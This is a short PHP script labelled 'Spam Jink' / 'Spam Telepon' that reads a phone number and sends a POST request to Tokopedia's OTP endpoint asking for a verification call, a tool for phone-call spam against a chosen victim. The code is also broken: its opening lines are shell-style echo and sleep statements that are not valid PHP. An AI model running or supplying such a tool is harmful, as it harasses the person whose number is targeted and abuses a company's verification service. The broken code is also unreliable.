<?php

echo " ============================= "
sleep 2
echo " ==        Spam Jink        == "
sleep 0.7
echo " ============================= "
//Spam Telepon
function send($phone) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokopedia.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
             echo $asw."\n";
}
echo "Nomor : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
















